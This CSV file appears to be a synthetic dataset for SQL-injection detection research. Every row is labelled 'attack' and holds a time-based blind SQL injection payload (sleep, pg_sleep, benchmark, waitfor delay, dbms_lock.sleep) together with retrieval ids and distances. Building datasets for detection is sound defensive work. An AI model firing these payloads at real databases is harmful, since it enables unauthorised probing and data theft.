id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000353,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,7.307306061311006
CTGAN_000354,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,6.2760919889225555
CTGAN_000355,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000304,6.595227077069766
CTGAN_000356,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,7.365135971398138
CTGAN_000357,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.158677169356022
CTGAN_000358,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.286224790327311
CTGAN_000359,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000193,5.320160357546622
CTGAN_000360,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,7.173621636772966
CTGAN_000361,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,7.677145819612136
CTGAN_000362,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,7.292440129829104
CTGAN_000363,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,6.982602044956619
CTGAN_000364,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000115,7.407637242392935
CTGAN_000365,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000130,7.8322427914350445
CTGAN_000366,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,6.805833945680104
CTGAN_000367,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000130,7.162490063133831
CTGAN_000368,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,5.981375499898977
CTGAN_000369,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.792312363642039
CTGAN_000370,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,7.991924641843714
CTGAN_000371,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,6.583197520475243
CTGAN_000372,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,7.090176696112569
CTGAN_000373,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000286,5.963446693764712
CTGAN_000374,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,6.785812923423949
CTGAN_000375,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,4.669461617746959
CTGAN_000376,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,6.681154083158008
CTGAN_000377,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,5.617157206597129
CTGAN_000378,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000287,5.699425639837282
CTGAN_000379,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,7.1470167143332315
CTGAN_000380,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,10.525531850100137
CTGAN_000381,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,7.400437992008156
CTGAN_000382,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,8.10790634712041
CTGAN_000383,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,5.1387784945354715
CTGAN_000384,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,6.5035911633637635
CTGAN_000385,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,7.469410454469563
CTGAN_000386,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,nearest_attack_euclidean,R000094,5.112861643415517
CTGAN_000387,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,4.701324647635386
CTGAN_000388,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,4.240570033267837
CTGAN_000389,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,6.288750776308035
CTGAN_000390,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000264,7.137355421722017
CTGAN_000391,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,5.29948371631416
CTGAN_000392,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,7.63694763081436
CTGAN_000393,attack,time,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,nearest_attack_euclidean,R000167,6.744886173079098
CTGAN_000394,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,9.337158000706344
CTGAN_000395,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,7.423956185110218
CTGAN_000396,attack,time,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,nearest_attack_euclidean,R000201,5.026495136246071
CTGAN_000397,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000230,6.287143223630855
CTGAN_000398,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,12.212506393102572
CTGAN_000399,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,6.172402984065021
CTGAN_000400,attack,time,"1%""   )    )    rlike sleep  (  5  )  #",nearest_attack_euclidean,R000170,6.267096008212159
CTGAN_000401,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,5.799542447894314
CTGAN_000402,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000276,6.329884906391504
CTGAN_000403,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,4.798619645731061
CTGAN_000404,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,6.977758809078215
CTGAN_000405,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000253,7.765328105995099
CTGAN_000406,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,7.130713602974898
CTGAN_000407,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,7.903523455024366
CTGAN_000408,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,5.888148343899863
CTGAN_000409,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,5.657022756111636
CTGAN_000410,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",nearest_attack_euclidean,R000269,7.141925137417163
CTGAN_000411,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,5.573079153247231
CTGAN_000412,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,5.132117979393295
CTGAN_000413,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,7.217362267166471
CTGAN_000414,attack,time,"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000224,4.975955418301743
CTGAN_000415,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,5.6092994957683
CTGAN_000416,attack,time,select sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000298,5.5292788321304025
CTGAN_000417,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,5.805548903548242
CTGAN_000418,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,7.336506970525778
CTGAN_000419,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",nearest_attack_euclidean,R000268,5.997919088038188
CTGAN_000420,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,5.664913468433454
CTGAN_000421,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000287,6.931410856798133
CTGAN_000422,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000163,6.150220320605718
CTGAN_000423,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000223,7.620648874995049
CTGAN_000424,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.336479043298663
CTGAN_000425,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,4.226397889553919
CTGAN_000426,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,6.049009498664239
CTGAN_000427,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,5.490806335613623
CTGAN_000428,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000260,8.585389714371146
CTGAN_000429,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,5.544813279179526
CTGAN_000430,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,7.340593337113325
CTGAN_000431,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,6.548295460261754
CTGAN_000432,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,5.674769547728186
CTGAN_000433,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,5.685001131569731
CTGAN_000434,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000115,6.365884380854712
CTGAN_000435,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.835639533360508
CTGAN_000436,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000287,5.118127684429513
CTGAN_000437,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,6.442290511285435
CTGAN_000438,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,6.7521079351019795
CTGAN_000439,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,4.691458201799447
CTGAN_000440,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,8.506635981763926
CTGAN_000441,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,5.007418409408953
CTGAN_000442,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000286,6.554776828253482
CTGAN_000443,attack,time,1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,nearest_attack_euclidean,R000220,7.100535493973908
CTGAN_000444,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000287,7.208098615940633
CTGAN_000445,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,6.570388928382398
CTGAN_000446,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.1551870928769
CTGAN_000447,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,7.194018400505409
CTGAN_000448,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,4.040666568975149
CTGAN_000449,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",nearest_attack_euclidean,R000187,6.132758755280742
CTGAN_000450,attack,time," select sleep  (  5  )   and   (  ""tlbp""  =  ""tlbp",nearest_attack_euclidean,R000229,5.896525232615505
CTGAN_000451,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.649164319327231
CTGAN_000452,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000163,6.534566028539212
CTGAN_000453,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,6.304429008524516
CTGAN_000454,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,7.976936780095894
CTGAN_000455,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.604175121624563
CTGAN_000456,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,7.738771732533599
CTGAN_000457,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000287,5.8349347123750155
CTGAN_000458,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,5.844169443014793
CTGAN_000459,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000264,9.310010223909757
CTGAN_000460,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,5.216703372680926
CTGAN_000461,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000157,5.410727371555144
CTGAN_000462,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,8.41307177593656
CTGAN_000463,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,7.1075559658755525
CTGAN_000464,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,6.184574367411796
CTGAN_000465,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,5.008753171288819
CTGAN_000466,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.188199041908616
CTGAN_000467,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,7.757781885373968
CTGAN_000468,attack,time,1%' or sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000255,7.570310941662303
CTGAN_000469,attack,time,1  )   waitfor delay '0:0:5' and   (  2993  =  2993,nearest_attack_euclidean,R000205,5.275352535256051
CTGAN_000470,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,6.378311285555843
CTGAN_000471,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",nearest_attack_euclidean,R000141,7.437019702850134
CTGAN_000472,attack,time,1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000153,9.682683214056004
CTGAN_000473,attack,time,1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,nearest_attack_euclidean,R000185,5.389679960676511
CTGAN_000474,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,6.979978469076195
CTGAN_000475,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,4.739863953108643
CTGAN_000476,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",nearest_attack_euclidean,R000246,7.103696517837428
CTGAN_000477,attack,time,1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000153,6.895417383074828
CTGAN_000478,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,7.681669528236865
CTGAN_000479,attack,time, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,nearest_attack_euclidean,R000132,8.202411843821661
CTGAN_000480,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.549780341177892
CTGAN_000481,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,6.6082123456102755
CTGAN_000482,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.38135867058061
CTGAN_000483,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,5.0649680234066325
CTGAN_000484,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,7.146437960040205
CTGAN_000485,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000276,6.481866510984532
CTGAN_000486,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,7.867616509824617
CTGAN_000487,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf",nearest_attack_euclidean,R000216,7.483644197260318
CTGAN_000488,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,7.721014918648386
CTGAN_000489,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",nearest_attack_euclidean,R000269,8.922822787409
CTGAN_000490,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,5.6364959329267
CTGAN_000491,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,8.146833476755948
CTGAN_000492,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.247396209962683
CTGAN_000493,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,5.360956485476344
CTGAN_000494,attack,time,1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,nearest_attack_euclidean,R000220,7.295460824747217
CTGAN_000495,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,5.397462506789205
CTGAN_000496,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000090,5.462109375003926
CTGAN_000497,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000139,6.073666538792557
CTGAN_000498,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000230,4.119770543337477
CTGAN_000499,attack,time,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,nearest_attack_euclidean,R000167,7.318376729879935
CTGAN_000500,attack,time,1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,nearest_attack_euclidean,R000220,7.3939429203279765
